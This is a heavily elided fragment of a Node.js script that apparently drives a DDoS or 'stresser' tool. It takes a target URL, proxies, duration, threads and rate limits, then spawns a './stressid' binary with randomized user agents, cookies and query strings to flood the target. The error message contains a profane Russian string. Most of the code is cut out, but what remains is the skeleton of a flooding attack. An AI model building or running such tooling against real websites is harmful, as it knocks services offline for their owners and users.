...
if (process.argv.length < 6) {
    ...
    console.log('\x1b[35m%s\x1b[0m', 'node browser1.js URL PROXY TIME THREADS RATELIMIT UA');
    process.exit(0);
}
...
function start(mode,target,domain,timeforattack,browsernum,random_ua,myString,reqperip,randed,rand_query) {
	...
	let promise = new Promise((res,rej) => {
        const ls = spawn('./stressid', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=" + reqperip, "time=" + timeforattack, "good=" + randed, "threads=15", "cookie=" + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);
		...
		).catch((err) => "Злоебучая ошибка:" + console.error(err));
}
